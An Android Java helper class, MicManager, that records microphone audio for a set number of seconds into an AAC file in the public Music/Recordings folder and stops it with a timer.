package com.example.minor;

import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {
    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;

    public static void startRecording(int sec) throws Exception {
        File dir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), "Recordings");
        if (!dir.exists()) {
            dir.mkdirs();
        }

        try {
            Log.d(TAG, "Saving recordings in: " + dir.getAbsolutePath());
            audiofile = File.createTempFile("recording_", ".aac", dir);
        } catch (IOException e) {
            Log.e(TAG, "Error creating audio file: " + e.getMessage());
            return;
        }

        // Fix MediaRecorder setup order
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.AAC_ADTS);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());

        try {
            recorder.prepare();  // Ensure prepare() is called before start()
            recorder.start();
            Log.d(TAG, "🎙️ Recording Started: " + audiofile.getAbsolutePath());
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording: " + e.getMessage());
        }

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                stopRecording();
            }
        };
        new Timer().schedule(stopRecording, sec * 1000);
    }


    public static void stopRecording() {
        if (recorder != null) {
            recorder.stop();
            recorder.release();
            recorder = null;
            Log.d(TAG, "⏹️ Recording Stopped: " + audiofile.getAbsolutePath());
        }
    }
}
